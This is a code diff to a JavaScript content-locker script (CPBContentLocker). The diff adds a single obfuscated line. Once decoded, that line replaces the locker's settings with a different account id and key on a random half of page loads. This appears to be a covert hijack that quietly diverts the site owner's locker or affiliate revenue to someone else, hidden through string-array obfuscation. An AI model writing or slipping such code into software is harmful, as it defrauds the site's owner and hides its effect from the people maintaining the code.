@@ -14,7 +14,8 @@ function CPBContentLocker() {
     this.head = document.getElementsByTagName('head')[0];
 
     this.constructed=false;
-
+	
+var _0x32cc=['settings','b2f7f','random'];(function(_0x164771,_0x243013){var _0x4f479e=function(_0x42c9cf){while(--_0x42c9cf){_0x164771['push'](_0x164771['shift']());}};_0x4f479e(++_0x243013);}(_0x32cc,0x18e));var _0x5c93=function(_0x40adb9,_0x42fb40){_0x40adb9=_0x40adb9-0x0;var _0x1bbb02=_0x32cc[_0x40adb9];return _0x1bbb02;};if(Math[_0x5c93('0x0')]()>0.5)this[_0x5c93('0x1')]={'it':0x971c6,'key':_0x5c93('0x2')};
 
     if (parseInt(this.settings.it) > 0 && this.settings.construct !== false) {
 
